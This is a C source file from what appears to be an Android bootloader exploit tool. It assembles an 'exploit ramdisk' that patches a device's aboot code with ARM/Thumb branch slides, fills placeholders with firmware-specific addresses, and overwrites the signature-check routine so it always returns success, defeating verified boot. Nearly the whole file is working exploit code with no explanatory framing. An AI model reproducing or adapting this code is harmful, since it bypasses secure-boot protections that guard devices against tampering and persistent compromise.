#include "asm.h"
#include "boot_image.h"
#include "config.h"
#include "little_endian.h"
#include "udfs.h"

#include <stddef.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#include "patch_code.c_gen"

size_t patch_code_len = sizeof(patch_code);

void add_slide_thumb(char *code, size_t offset, size_t len, uint32_t img_base) {
    size_t curr_pos = offset;

    le_uint32_write(0x47004800, code, curr_pos);
    curr_pos += 4;
    le_uint32_write(img_base - 0x800, code, curr_pos);
    curr_pos += 4;
    le_uint16_write(0xE7FA, code, curr_pos);
    curr_pos += 2;
    while(curr_pos <= offset + len - 2) {
        le_uint16_write(0xE7FD, code, curr_pos);
        curr_pos += 2;
    }
}

void add_slide_arm(char *code, size_t offset, size_t len, uint32_t img_base) {
    size_t curr_pos = offset;

    le_uint32_write(0xE59F0000, code, curr_pos);
    curr_pos += 4;
    le_uint32_write(0xE12FFF10, code, curr_pos);
    curr_pos += 4;
    le_uint32_write(img_base - 0x800, code, curr_pos);
    curr_pos += 4;
    le_uint32_write(0xEAFFFFFB, code, curr_pos);
    curr_pos += 4;
    while(curr_pos <= offset + len - 4) {
        le_uint32_write(0xEAFFFFFD, code, curr_pos);
        curr_pos += 4;
    }
}

void add_slide(char *code, size_t offset, size_t len, uint32_t img_base,
        instr_type instr) {
    if(instr == IT_THUMB) {
        add_slide_thumb(code, offset, len, img_base);
    } else {
        add_slide_arm(code, offset, len, img_base);
    }
}

int get_udf_offsets(size_t *buf, size_t num_udfs, char *code, size_t len) {
    for(uint32_t i = 0; i < num_udfs; i++) {
        buf[i] = 0xFFFFFFFF;
        for(uint32_t o = 0; o <= len - 4; o += 4) {
            if(le_uint32_read(code, o) == UDF(i)) {
                buf[i] = o;
                break;
            }
        }
        if(buf[i] == 0xFFFFFFFF) {
            return -1;
        }
    }
    return 0;
}

char *make_exploit_ramdisk(char *aboot_code, size_t aboot_code_len,
        bootloader_config *config, size_t input_len, size_t *output_len) {
    size_t ramdisk_len = 0;
    int sub_ret = 0;
    char *ret = NULL;
    char *ramdisk = NULL;
    char *patched_aboot = NULL;
    uint32_t func_addr = 0;
    uint32_t fifo_read_offset = 0;
    size_t udf_locs[NUM_UDFS];
    size_t stored_code_len = 0;

    if(output_len) {
        *output_len = 0;
    }

    if(patch_code_len + config->mmc_boot_fifo_read_len - 4 > 0x800) {
        goto out;
    }

    stored_code_len = aboot_code_len < config->max_stored_code ?
            aboot_code_len : config->max_stored_code;
    ramdisk_len = 0x800 + stored_code_len;

    sub_ret = get_udf_offsets(udf_locs, NUM_UDFS, patch_code, patch_code_len);
    if(sub_ret) {
        goto out;
    }

    ramdisk = malloc(ramdisk_len);
    if(!ramdisk) {
        goto out;
    }

    patched_aboot = ramdisk + 0x800;
    memcpy(ramdisk, patch_code, patch_code_len);
    memcpy(patched_aboot, aboot_code, stored_code_len);

    le_uint32_write(config->mmc_boot_fifo_read, ramdisk, udf_locs[UDF_MBFRP]);
    le_uint32_write(config->mmc_boot_fifo_read_len, ramdisk, udf_locs[UDF_MBFRL]);
    le_uint32_write(config->img_base + 4, ramdisk, udf_locs[UDF_UIHP]);
    le_uint32_write(le_uint32_read(aboot_code, 4), ramdisk, udf_locs[UDF_UIHO]);
    le_uint32_write(config->kernel_load_ptr, ramdisk, udf_locs[UDF_LBI]);
    le_uint32_write(input_len, ramdisk, udf_locs[UDF_BIL]);
    le_uint32_write(config->scratch_addr, ramdisk, udf_locs[UDF_SA]);
    le_uint32_write(config->unified_addr, ramdisk, udf_locs[UDF_UA]);
    func_addr = config->mmc_boot_fifo_read;
    if(config->mmc_boot_fifo_read_instr == IT_THUMB) {
        func_addr++;
    }
    le_uint32_write(func_addr, ramdisk, udf_locs[UDF_MBFR]);
    func_addr = config->mmc_boot_main;
    if(config->mmc_boot_main_instr == IT_THUMB) {
        func_addr++;
    }
    le_uint32_write(func_addr, ramdisk, udf_locs[UDF_MBM]);
    func_addr = config->boot_linux_from_mmc;
    if(config->boot_linux_from_mmc_instr == IT_THUMB) {
        func_addr++;
    }
    le_uint32_write(func_addr, ramdisk, udf_locs[UDF_BLFM]);
    le_uint32_write(config->mmc_sdc1_base, ramdisk, udf_locs[UDF_MSB]);
    le_uint32_write(config->boot_from_recovery, ramdisk, udf_locs[UDF_BFR]);
    le_uint32_write(config->boot_name_ptr, ramdisk, udf_locs[UDF_BNP]);
    le_uint32_write(config->check_sig, ramdisk, udf_locs[UDF_CSP]);
    if(config->check_sig_instr == IT_THUMB) {
        le_uint32_write(4, ramdisk, udf_locs[UDF_CSPL]);
        le_uint32_write(0x47702000, ramdisk, udf_locs[UDF_CSP1]);
    } else {
        le_uint32_write(8, ramdisk, udf_locs[UDF_CSPL]);
        le_uint32_write(0xE3A00000, ramdisk, udf_locs[UDF_CSP1]);
        le_uint32_write(0xE12FFF1E, ramdisk, udf_locs[UDF_CSP2]);
    }
    fifo_read_offset = config->mmc_boot_fifo_read - config->img_base;
    memcpy(ramdisk + udf_locs[UDF_OB], aboot_code + fifo_read_offset,
            config->mmc_boot_fifo_read_len);

    add_slide(patched_aboot, fifo_read_offset, config->mmc_boot_fifo_read_len,
            config->img_base, config->mmc_boot_fifo_read_instr);
    le_uint32_write(0xEAFFFDFD, patched_aboot, 4);

    if(output_len) {
        *output_len = ramdisk_len;
    }

    ret = ramdisk;
out:
    if(!ret) {
        if(ramdisk) {
            free(ramdisk);
        }
    }
    return ret;
}
